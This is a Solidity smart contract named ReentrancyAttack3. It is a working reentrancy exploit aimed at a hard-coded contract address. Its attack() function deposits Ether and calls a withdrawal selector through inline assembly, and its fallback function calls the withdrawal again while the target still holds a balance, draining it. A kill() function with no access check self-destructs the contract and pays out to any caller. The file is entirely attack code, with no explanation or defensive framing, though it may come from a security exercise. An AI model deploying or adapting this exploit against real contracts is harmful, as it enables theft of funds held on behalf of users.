pragma solidity ^0.5.0;

contract ReentrancyAttack3 {
    
    address _reentrancy = 0x0DCd2F752394c41875e259e00bb44fd505297caF;
    bytes4 selector2 = 0x7362377b;

    constructor () public {}
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
    
    function attack() public payable {
        bytes4 sig1 = bytes4(keccak256("setEther()"));
        bytes4 sig2 = 0x7362377b;

        assembly {
            let pointer := mload(0x40)
            mstore(pointer, sig1)
            
            let success := call(not(0), sload(0), callvalue, pointer, 0x04, pointer, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(add(pointer,0x04), sig2)
            
            let success2 := call(not(0), sload(0), 0, add(pointer,0x04), 0x04, add(pointer,0x04), 0)
            if iszero(success2) {
                revert(0, 0)
            }
        }
    }
    
    function kill() public{
        selfdestruct(msg.sender);
    }
    
    function () external payable {
        if (address(_reentrancy).balance >= msg.value) {
            bytes4 sig2 = 0x7362377b;

            assembly{
                let pointer := mload(0x40)
                mstore(pointer, sig2)
                let success2 := call(not(0), sload(0), 0, pointer, 0x04, pointer, 0)
                if iszero(success2) {
                    revert(0, 0)
                }
            }
        }
    }
}
